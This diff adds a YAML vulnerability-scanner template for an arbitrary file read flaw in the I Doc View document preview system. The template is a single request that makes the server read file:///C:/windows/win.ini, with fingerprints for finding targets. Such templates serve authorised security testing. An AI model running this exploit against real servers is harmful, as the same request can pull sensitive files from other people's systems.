@@ -1,0 +1,24 @@
+id: poc-yaml-idocv-qJvqhFt-anyfile-read
+info:
+  name: I doc view在线文档预览系统 qJvqhFt 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: I Doc View
+  fofa: I Doc View在线文档预览
+requests:
+- method: GET
+  path: /view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi
+  expression: 'status_code == 200 &&
+
+    contains(body,"; for 16-bit app support") &&
+
+    contains(body,"[files]") &&
+
+    contains(headers,"application/json") &&
+
+    contains(headers,"idocv")
+
+    '
+variables: {}
+transport: http
